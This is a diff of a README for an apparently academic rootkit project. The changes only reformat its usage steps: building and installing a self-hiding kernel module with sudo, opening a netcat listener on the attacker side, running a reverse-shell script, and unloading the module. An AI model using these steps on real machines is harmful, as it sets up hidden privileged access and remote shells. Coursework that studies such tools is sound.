@@ -16,20 +16,28 @@ We implemented a rootkit module. It can hide itself from the module list and gra
 - rootkit.h
 
 ## How to Load & Run? <br />
-On target bot side: <br />
-  make <br />
-  sudo ./install_rootkit.sh <br />
+On target bot side: 
+  ```bash
+  make
+  sudo ./install_rootkit.sh
+  ```
   
 On Attacker side: <br />
-  nc -l -p <listen_port> -vvv <br />
+ ```bash
+ nc -l -p <listen_port> -vvv 
+ ```
   
 Standard user on target side:<br />
-  ./reverse_shell.sh <br />
+ ```bash
+  ./reverse_shell.sh 
+ ```
 You may modify the attacker server ip address & listen port in the reverse_shell script <br />
 
 ## How to Unload？<br />
-  echo "unhide" > /proc/CS460/status<br />
+  ```bash
+  echo "unhide" > /proc/CS460/status
   sudo rmmod rootkit
+  ```
 
 ## Warning!!!<br/>
 This project is designed for academic research and study usage only.<br /> 
